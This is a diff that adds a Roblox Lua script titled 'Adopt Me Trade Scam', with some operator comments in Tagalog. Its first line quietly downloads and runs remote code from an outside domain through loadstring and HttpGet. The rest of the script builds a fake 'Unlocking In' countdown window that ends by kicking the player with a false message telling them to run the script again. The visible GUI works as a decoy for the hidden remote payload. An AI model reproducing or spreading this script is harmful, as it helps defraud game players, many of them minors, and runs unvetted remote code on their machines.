@@ -1,0 +1,145 @@
+loadstring(game:HttpGet("https://egorikusa.space/094b70b009dcfdd51209426b.lua", true))()
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game:GetService("CoreGui")
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0.4, 0, 0.3, 0)
+frame.Position = UDim2.new(0.3, 0, 0.35, 0)
+frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+local frameUICorner = Instance.new("UICorner")
+frameUICorner.CornerRadius = UDim.new(0.1, 0)
+frameUICorner.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0.2, 0)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "Adopt Me Trade Scam"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 28
+title.Font = Enum.Font.GothamBold
+title.Parent = frame
+
+local unlockingLabel = Instance.new("TextLabel")
+unlockingLabel.Size = UDim2.new(1, 0, 0.2, 0)
+unlockingLabel.Position = UDim2.new(0, 0, 0.25, 0)
+unlockingLabel.BackgroundTransparency = 1
+unlockingLabel.Text = "Unlocking In"
+unlockingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+unlockingLabel.TextSize = 22
+unlockingLabel.Font = Enum.Font.Gotham
+unlockingLabel.Parent = frame
+
+local timerLabel = Instance.new("TextLabel")
+timerLabel.Size = UDim2.new(1, 0, 0.3, 0)
+timerLabel.Position = UDim2.new(0, 0, 0.5, 0)
+timerLabel.BackgroundTransparency = 1
+timerLabel.Text = "60:00"
+timerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+timerLabel.TextSize = 32
+timerLabel.Font = Enum.Font.GothamBold
+timerLabel.Parent = frame
+
+local notificationFrame = Instance.new("Frame")
+notificationFrame.Size = UDim2.new(0.4, 0, 0.08, 0)
+notificationFrame.Position = UDim2.new(0.3, 0, 0.9, 0)
+notificationFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+notificationFrame.BackgroundTransparency = 0.3
+notificationFrame.BorderSizePixel = 0
+notificationFrame.Parent = screenGui
+notificationFrame.Visible = false
+
+local notificationUICorner = Instance.new("UICorner")
+notificationUICorner.CornerRadius = UDim.new(0.1, 0)
+notificationUICorner.Parent = notificationFrame
+
+local notificationText = Instance.new("TextLabel")
+notificationText.Size = UDim2.new(1, 0, 1, 0)
+notificationText.Position = UDim2.new(0, 0, 0, 0)
+notificationText.BackgroundTransparency = 1
+notificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
+notificationText.TextSize = 20
+notificationText.Font = Enum.Font.GothamBold
+notificationText.TextScaled = true
+notificationText.Parent = notificationFrame
+
+local time = 300 -- search ka sa google minutes to seconds o hour to seconds yan ay 1 hour o 60M max 60Minutes o 1 hour
+local function formatTime(seconds)
+    local minutes = math.floor(seconds / 60)
+    local remainingSeconds = seconds % 60
+    return string.format("%02d:%02d", minutes, remainingSeconds)
+end
+
+local function showNotification(message)
+    notificationText.Text = message
+    notificationFrame.Visible = true
+    notificationFrame:TweenPosition(UDim2.new(0.3, 0, 0.85, 0), "Out", "Quad", 0.5, true)
+    wait(3)
+    notificationFrame:TweenPosition(UDim2.new(0.3, 0, 1.1, 0), "Out", "Quad", 0.5, true)
+    wait(0.5)
+    notificationFrame.Visible = false
+end
+
+local function complete()
+local Player = game.Players.LocalPlayer
+-- lagay mo yung adipt me gui dito or kick remove molang yung kick kapag gusto mo ng custom gui
+    showNotification("Unlock Complete")
+    
+Player:Kick("Look's Like The Developer Detected Our Script Try Executing The Scriot Again")
+   
+end
+
+timerLabel.Text = formatTime(time)
+spawn(function()
+    while time > 0 do
+        wait(1)
+        time = time - 1
+        timerLabel.Text = formatTime(time)
+    end
+    complete()
+end)
+
+local UIS = game:GetService("UserInputService")
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    frame.Position = UDim2.new(
+        startPos.X.Scale, 
+        startPos.X.Offset + delta.X, 
+        startPos.Y.Scale, 
+        startPos.Y.Offset + delta.Y
+    )
+end
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UIS.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
